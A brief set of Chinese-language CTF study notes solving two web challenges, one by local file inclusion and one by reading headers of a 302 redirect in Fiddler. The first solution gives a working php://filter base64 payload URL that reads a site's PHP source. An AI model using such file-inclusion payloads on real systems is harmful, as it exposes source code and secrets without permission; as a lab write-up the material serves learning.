##CTF联系纪要##
##实验地址：https://cgctf.nuptsast.com/challenges#Web###
###实验资料：https://ctf-wiki.github.io/ctf-wiki

1.web
 .文件包含 属于php代码审计类
 题目：文件包含没错 这就是传说中的LFI
 源码分析：<html>
    <title>asdf</title>
    
<a href="./index.php?file=show.php">click me? no</a></html>
使用连接：http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php  decode base64获得flag

.查看header 单身一百年也没用
源码分析：
<html>
    <head>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
    </head>
    <body>
        <a href="./index.php">_到这里找key__</a>
    </body>
</html>
使用工具fiddler  这是一个302重定向  查看header的 miscellaneous 得到flag
